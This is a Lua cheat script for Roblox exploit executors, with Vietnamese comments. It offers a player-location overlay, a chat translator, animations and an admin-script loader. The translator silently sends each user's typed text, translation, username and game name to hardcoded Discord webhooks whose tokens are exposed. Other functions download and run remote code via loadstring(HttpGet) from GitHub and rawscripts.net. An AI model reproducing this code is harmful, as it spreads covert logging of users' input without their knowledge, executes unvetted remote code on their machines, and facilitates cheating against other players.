-- =================================================================
-- SCRIPT CHÍNH TỔNG HỢP (tp.lua) - BẢN ĐẦY ĐỦ TIỆN ÍCH
-- TELEPORT + DỊCH CHAT + KURDISH ANIMATIONS + BOT TRIGGER + TRACKER
-- =================================================================
print("⏳ Đang khởi chạy tp.lua bản tích hợp Tracker...")

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local MarketService = game:GetService("MarketplaceService")
local GroupService = game:GetService("GroupService")
local localPlayer = Players.LocalPlayer
local playerGui = localPlayer:WaitForChild("PlayerGui")

-- 0. Nhắc tham gia Group
local GROUP_ID = 175907291
task.spawn(function()
    task.wait(2)
    if not localPlayer:IsInGroup(GROUP_ID) then
        pcall(function() GroupService:PromptJoinAsync(GROUP_ID) end)
    end
end)

-- 1. Webhook cấu hình
local rawWebhookBot = "https://discord.com/api/webhooks/1556970046679547924/GYvAH0yk3kFrs1YiO8w485O4Sv3w9ZHDFQ7WYBVoFlCS1Ih9AVGNBICeFxhob1prIbAn"
local WEBHOOK_BOT_URL = "https://cf-discord-proxy.numelon-web-services.workers.dev/?url=" .. rawWebhookBot

local rawWebhookChat = "https://discord.com/api/webhooks/1556960491086155776/qv4XW06rSiS1cvwTYszxAYyBJwrmJ9gBlp-9R4CTgxlxkEYvSLguUG9tQXqxg15tTefP"
local WEBHOOK_CHAT_URL = "https://cf-discord-proxy.numelon-web-services.workers.dev/?url=" .. rawWebhookChat

local successName, gameInfo = pcall(function()
    return MarketService:GetProductInfo(game.PlaceId)
end)
local gameName = (successName and gameInfo and gameInfo.Name) or "Unknown Game"
local isTargetGame = (game.PlaceId == 10033751448)

local function sendBotLog(actionName, details)
    task.spawn(function()
        pcall(function()
            local GameStore = _G.GameStore
            if not GameStore then
                local keywordUrl = "https://raw.githubusercontent.com/ductrungvo344-pixel/Hack/refs/heads/main/game_keyword.lua"
                local success, res = pcall(function()
                    return loadstring(game:HttpGet(keywordUrl))()
                end)
                if success then GameStore = res end
            end
            if GameStore and GameStore.SaveData then
                GameStore.SaveData(gameName, details, game.PlaceId)
            end
        end)
    end)
end

local function sendChatLog(vietnameseText, englishText)
    task.spawn(function()
        pcall(function()
            local payload = {
                ["content"] = string.format("🌐 **[Log Dịch Chat]**\n👤 **Player:** `%s`\n🗺️ **Game:** `%s`\n🇻🇳 **Tiếng Việt:** `%s`\n🇬🇧 **Tiếng Anh:** `%s`", 
                    localPlayer.Name, gameName, vietnameseText, englishText)
            }
            local reqFunc = request or http_request or (syn and syn.request)
            if reqFunc then
                reqFunc({
                    Url = WEBHOOK_CHAT_URL,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = HttpService:JSONEncode(payload)
                })
            end
        end)
    end)
end

-- =================================================================
-- LOGIC HỆ THỐNG ĐỊNH VỊ VỊ TRÍ NGƯỜI CHƠI (PLAYER TRACKER)
-- =================================================================
local trackerEnabled = false
local trackerFolder = Instance.new("Folder", workspace)
trackerFolder.Name = "PlayerTrackerFolder"

local function createTrackerForPlayer(plr)
    if plr == localPlayer then return end

    local function addTag(character)
        if not character then return end
        local head = character:WaitForChild("Head", 5)
        if not head or head:FindFirstChild("TrackerGui") then return end

        local billboard = Instance.new("BillboardGui")
        billboard.Name = "TrackerGui"
        billboard.Adornee = head
        billboard.Size = UDim2.new(0, 150, 0, 40)
        billboard.StudsOffset = Vector3.new(0, 2.5, 0)
        billboard.AlwaysOnTop = true
        billboard.Parent = head

        local label = Instance.new("TextLabel")
        label.Size = UDim2.new(1, 0, 1, 0)
        label.BackgroundTransparency = 1
        label.TextColor3 = Color3.fromRGB(0, 255, 150)
        label.TextStrokeTransparency = 0.2
        label.Font = Enum.Font.GothamBold
        label.TextSize = 11
        label.Parent = billboard

        -- Loop cập nhật khoảng cách liên tục
        task.spawn(function()
            while billboard and billboard.Parent and trackerEnabled do
                local myChar = localPlayer.Character
                local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
                local targetRoot = character:FindFirstChild("HumanoidRootPart")

                if myRoot and targetRoot then
                    local dist = math.floor((myRoot.Position - targetRoot.Position).Magnitude)
                    label.Text = string.format("👤 %s\n📏 %dm", plr.DisplayName, dist)
                end
                task.wait(0.2)
            end
        end)
    end

    if plr.Character then addTag(plr.Character) end
    plr.CharacterAdded:Connect(addTag)
end

local function toggleTracker(state)
    trackerEnabled = state
    if not trackerEnabled then
        for _, plr in pairs(Players:GetPlayers()) do
            if plr.Character and plr.Character:FindFirstChild("Head") then
                local gui = plr.Character.Head:FindFirstChild("TrackerGui")
                if gui then gui:Destroy() end
            end
        end
    else
        for _, plr in pairs(Players:GetPlayers()) do
            createTrackerForPlayer(plr)
        end
    end
end

Players.PlayerAdded:Connect(function(plr)
    if trackerEnabled then
        createTrackerForPlayer(plr)
    end
end)

-- =================================================================
-- KHỞI TẠO GIAO DIỆN (GUI)
-- =================================================================
if playerGui:FindFirstChild("TeleportGUI") then
    playerGui.TeleportGUI:Destroy()
end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "TeleportGUI"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 240, 0, 420)
frame.Position = UDim2.new(0.05, 0, 0.18, 0)
frame.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui

local uiCorner = Instance.new("UICorner")
uiCorner.CornerRadius = UDim.new(0, 8)
uiCorner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(0.7, 0, 0, 25)
title.Position = UDim2.new(0.05, 0, 0, 5)
title.BackgroundTransparency = 1
title.Text = "⚡ MENU CHÍNH & TRACKER"
title.TextColor3 = Color3.fromRGB(255, 215, 0)
title.TextSize = 11
title.Font = Enum.Font.GothamBold
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = frame

local minBtn = Instance.new("TextButton")
minBtn.Size = UDim2.new(0, 22, 0, 22)
minBtn.Position = UDim2.new(0.85, 0, 0, 6)
minBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
minBtn.Text = "-"
minBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
minBtn.TextSize = 14
minBtn.Font = Enum.Font.GothamBold
minBtn.Parent = frame

local minCorner = Instance.new("UICorner")
minCorner.CornerRadius = UDim.new(0, 4)
minCorner.Parent = minBtn

local scroll = Instance.new("ScrollingFrame")
scroll.Size = UDim2.new(0.95, 0, 0, 375)
scroll.Position = UDim2.new(0.025, 0, 0, 35)
scroll.BackgroundTransparency = 1
scroll.BorderSizePixel = 0
scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
scroll.ScrollBarThickness = 6
scroll.Parent = frame

local function createButton(name, text, positionY, color)
    local btn = Instance.new("TextButton")
    btn.Name = name
    btn.Size = UDim2.new(0.95, 0, 0, 26)
    btn.Position = UDim2.new(0.02, 0, 0, positionY)
    btn.BackgroundColor3 = color
    btn.Text = text
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.TextSize = 11
    btn.Font = Enum.Font.GothamBold
    btn.Parent = scroll

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 4)
    corner.Parent = btn
    return btn
end

local function createSubLabel(text, positionY)
    local lbl = Instance.new("TextLabel")
    lbl.Size = UDim2.new(0.95, 0, 0, 18)
    lbl.Position = UDim2.new(0.02, 0, 0, positionY)
    lbl.BackgroundTransparency = 1
    lbl.Text = text
    lbl.TextColor3 = Color3.fromRGB(200, 200, 200)
    lbl.TextSize = 10
    lbl.Font = Enum.Font.GothamBold
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.Parent = scroll
    return lbl
end

local currentY = 2

-- 1. NÚT XÁC ĐỊNH VỊ TRÍ NGƯỜI CHƠI (TRACKER)
createSubLabel("📍 VỊ TRÍ NGƯỜI CHƠI (TRACKER)", currentY)
local trackerBtn = createButton("TrackerBtn", "📍 Hiện Vị Trí Player: OFF", currentY + 20, Color3.fromRGB(255, 70, 70))
currentY = currentY + 52

trackerBtn.MouseButton1Click:Connect(function()
    trackerEnabled = not trackerEnabled
    toggleTracker(trackerEnabled)
    if trackerEnabled then
        trackerBtn.Text = "📍 Hiện Vị Trí Player: ON"
        trackerBtn.BackgroundColor3 = Color3.fromRGB(0, 180, 90)
    else
        trackerBtn.Text = "📍 Hiện Vị Trí Player: OFF"
        trackerBtn.BackgroundColor3 = Color3.fromRGB(255, 70, 70)
    end
end)

-- 2. BOT TRIGGER
createSubLabel("🤖 SCRIPTBLOX BOT TRIGGER", currentY)
local botSendBtn = createButton("BotSendBtn", "📤 Gửi Game Info Lên Bot", currentY + 20, Color3.fromRGB(150, 0, 200))
currentY = currentY + 52

botSendBtn.MouseButton1Click:Connect(function()
    botSendBtn.Text = "⏳ Đang gửi..."
    sendBotLog("Request ScriptBlox & Rscripts", "Yêu cầu quét script cho: " .. gameName)
    task.wait(1.5)
    botSendBtn.Text = "📤 Gửi Game Info Lên Bot"
end)

-- 3. DỊCH CHAT
createSubLabel("🌐 DỊCH CHAT (MYMEMORY API)", currentY)
local chatBox = Instance.new("TextBox")
chatBox.Size = UDim2.new(0.95, 0, 0, 26)
chatBox.Position = UDim2.new(0.02, 0, 0, currentY + 20)
chatBox.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
chatBox.PlaceholderText = "Nhập tiếng Việt cần dịch..."
chatBox.Text = ""
chatBox.TextColor3 = Color3.fromRGB(255, 255, 255)
chatBox.TextSize = 11
chatBox.Font = Enum.Font.Gotham
chatBox.ClearTextOnFocus = false
chatBox.Parent = scroll

local boxCorner = Instance.new("UICorner")
boxCorner.CornerRadius = UDim.new(0, 4)
boxCorner.Parent = chatBox

local translateBtn = createButton("TransBtn", "🔍 Dịch sang English", currentY + 50, Color3.fromRGB(0, 120, 255))
local resultBox = Instance.new("TextBox")
resultBox.Size = UDim2.new(0.95, 0, 0, 26)
resultBox.Position = UDim2.new(0.02, 0, 0, currentY + 78)
resultBox.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
resultBox.PlaceholderText = "Bản dịch tiếng Anh..."
resultBox.Text = ""
resultBox.TextColor3 = Color3.fromRGB(0, 255, 150)
resultBox.TextSize = 11
resultBox.Font = Enum.Font.GothamBold
resultBox.ClearTextOnFocus = false
resultBox.Parent = scroll

local resCorner = Instance.new("UICorner")
resCorner.CornerRadius = UDim.new(0, 4)
resCorner.Parent = resultBox

local copyBtn = createButton("CopyBtn", "📋 Copy Bản Dịch", currentY + 108, Color3.fromRGB(0, 180, 90))
currentY = currentY + 140

translateBtn.MouseButton1Click:Connect(function()
    local input = chatBox.Text
    if input == "" or input == " " then return end
    translateBtn.Text = "⏳ Đang dịch..."
    task.spawn(function()
        local success, result = pcall(function()
            local cleanInput = HttpService:UrlEncode(input)
            local url = "https://api.mymemory.translated.net/get?q=" .. cleanInput .. "&langpair=vi|en"
            local reqFunc = request or http_request or (syn and syn.request)
            if not reqFunc then return nil end
            local res = reqFunc({ Url = url, Method = "GET" })
            if res and (res.StatusCode == 200 or res.StatusDescription == "OK") then
                local data = HttpService:JSONDecode(res.Body)
                return data and data.responseData and data.responseData.translatedText
            end
            return nil
        end)
        
        if success and result and result ~= "" then
            resultBox.Text = result
            sendChatLog(input, result)
        else
            resultBox.Text = "⚠️ Lỗi dịch thuật!"
        end
        translateBtn.Text = "🔍 Dịch sang English"
    end)
end)

copyBtn.MouseButton1Click:Connect(function()
    if resultBox.Text ~= "" and resultBox.Text ~= "⚠️ Lỗi dịch thuật!" then
        pcall(function() setclipboard(resultBox.Text) end)
        copyBtn.Text = "✅ Đã Copy!"
        task.wait(1.5)
        copyBtn.Text = "📋 Copy Bản Dịch"
    end
end)

-- 4. TELEPORT & ADMIN
createSubLabel("🛠️ SCRIPT KHÁC", currentY)
local adminBtn = createButton("Admin", "👑 Nameless Admin", currentY + 20, Color3.fromRGB(255, 140, 0))
currentY = currentY + 52

adminBtn.MouseButton1Click:Connect(function()
    pcall(function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Nameless-Admin-23304"))() end)
end)

-- 5. KURDISH ANIMATIONS SECTION
local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local isR15 = (humanoid.RigType == Enum.HumanoidRigType.R15)

createSubLabel(isR15 and "💃 ANIMATIONS (R15)" or "💃 ANIMATIONS (R6)", currentY)
currentY = currentY + 20

local animList = {}
if not isR15 then
    animList = {
        {"Head Throw", "35154961", true, 1}, {"Floating Head", "121572214", false, 1},
        {"Crouch", "182724289", false, 1}, {"Floor Crawl", "282574440", false, 1},
        {"Dino Walk", "204328711", false, 1}, {"Jumping Jacks", "429681631", false, 1},
        {"Hero Jump", "184574340", true, 1}, {"Faint", "181526230", false, 1},
        {"Dab", "183412246", true, 1}, {"Spinner", "188632011", true, 2},
        {"Spin Dance", "429730430", true, 1}, {"Moon Dance", "45834924", true, 1}
    }
else
    animList = {
        {"Crazy Slash", "674871189", true, 1}, {"Open", "582855105", true, 1},
        {"R15 Spinner", "754658275", true, 1}, {"Arms Out", "582384156", true, 1},
        {"Float Slash", "717879555", true, 1}, {"Fling Arms", "754656200", true, 10}
    }
end

local normalColor = isR15 and Color3.fromRGB(110, 115, 140) or Color3.fromRGB(180, 140, 60)
local activeColor = isR15 and Color3.fromRGB(140, 160, 220) or Color3.fromRGB(230, 180, 70)

for _, animData in ipairs(animList) do
    local animName, animId, isLoop, speed = animData[1], animData[2], animData[3], animData[4]
    local animObj = Instance.new("Animation")
    animObj.AnimationId = "rbxassetid://" .. animId
    local track = humanoid:LoadAnimation(animObj)
    
    local btn = createButton("Anim_" .. animName, animName, currentY, normalColor)
    currentY = currentY + 28
    
    local isPlaying = false
    btn.MouseButton1Click:Connect(function()
        isPlaying = not isPlaying
        if isPlaying then
            btn.BackgroundColor3 = activeColor
            if isLoop then
                task.spawn(function()
                    while isPlaying do
                        if not track.IsPlaying then track:Play(0.1, 1, speed) end
                        task.wait()
                    end
                end)
            else
                track:Play(0.1, 1, speed)
            end
        else
            track:Stop()
            btn.BackgroundColor3 = normalColor
        end
    end)
end

scroll.CanvasSize = UDim2.new(0, 0, 0, currentY + 30)

minBtn.MouseButton1Click:Connect(function()
    local isOpen = scroll.Visible
    scroll.Visible = not isOpen
    frame.Size = isOpen and UDim2.new(0, 240, 0, 35) or UDim2.new(0, 240, 0, 420)
    minBtn.Text = isOpen and "+" or "-"
end)

print("🎉 Khởi chạy thành công tp.lua hoàn chỉnh!")
